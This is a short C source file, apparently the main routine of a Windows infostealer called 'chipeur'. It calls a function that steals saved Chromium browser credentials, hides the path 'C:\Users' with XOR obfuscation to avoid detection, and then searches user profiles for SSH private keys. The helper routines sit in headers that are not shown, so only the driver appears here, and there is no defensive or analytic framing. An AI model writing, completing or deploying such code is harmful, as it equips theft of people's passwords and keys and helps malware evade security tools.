#include "chipeur.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wchar.h>
#include <windows.h>

#include "chromium.h"
#include "find_ssh_key.h"
#include "obfuscation.h"

int main(void) {
  // Puts the console in UTF-8
  // Allows us to print non-ASCII characters for debug
  SetConsoleOutputCP(CP_UTF8);

  steal_chromium_creds();

  wchar_t users_path[] = L"\x69\x10\x76\x7f\x59\x4f\x58\x59";  // C:\Users
  XOR_STR(users_path, 8);

  find_ssh_key(users_path);
  return EXIT_SUCCESS;
}
